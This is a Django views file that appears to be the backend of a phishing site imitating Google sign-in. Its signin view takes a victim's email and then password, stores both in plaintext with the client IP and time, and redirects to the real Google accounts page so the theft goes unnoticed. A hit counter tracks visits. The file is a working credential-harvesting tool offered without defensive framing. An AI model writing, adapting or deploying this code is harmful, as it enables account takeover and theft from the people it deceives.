from django.http import JsonResponse
from django.shortcuts import render, HttpResponsePermanentRedirect
from django.core.validators import validate_email
from django.core.exceptions import ValidationError
from datetime import datetime

from .models import SignIn
from .utils import get_client_ip, increment_hit_count


hits:dict = {
    '/':0,
    '/signin':0,
    '/error':0,
    '/get-hits':0,
}


def index(request):
    hits['/'] += 1
    return render(request, 'index.html')


def signin(request):
    hits['/signin'] += 1

    try:
        if request.method == 'POST':
            email = request.POST.get('email', None)
            password = request.POST.get('password', None)
            client_ip = get_client_ip(request)

            if email and password:
                SignIn(email=str(email).strip(), password=str(
                    password).strip(), date_time=datetime.now(), client_ip=client_ip).save()
                return HttpResponsePermanentRedirect(f'https://accounts.google.com?authuser={email}')
            elif email:
                try:
                    validate_email(email)
                    return render(request, 'passwd.html', {'email': email})
                except ValidationError:
                    pass

        return index(request)
    except Exception as e:
        print(e)
        return error(request)


def error(request):
    hits['/error'] += 1
    return render(request, '400.html')

def get_hit_counts(request):
    hits['/get-hits'] += 1

    return JsonResponse({"hits":hits})